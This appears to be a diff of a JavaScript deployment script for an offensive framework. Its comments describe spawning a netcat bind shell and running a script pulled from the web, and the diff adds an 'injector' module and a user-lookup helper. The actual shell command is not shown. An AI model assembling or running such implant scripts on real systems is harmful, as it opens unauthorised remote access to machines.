@@ -1,4 +1,10 @@
+
+
+var injector = require("injector");
+
 // genesis script, spawns a generic bind shell in the background
+
+
 
 var hello_world;
 var hash;
@@ -7,7 +13,7 @@ var fn;
 function BeforeDeploy() {
   hello_world = "testing generic netcat bind shell and script pulled from the web";
   console.log(hello_world);
-  return true; 
+  return true;
 }
 
 function Deploy() {
@@ -27,4 +33,9 @@ function AfterDeploy() {
   hello_world = "done test";
   console.log(hello_world);
   return true;
+}
+
+function FindUser(name) {
+  user = os.FindUser(name);
+  return user;
 }
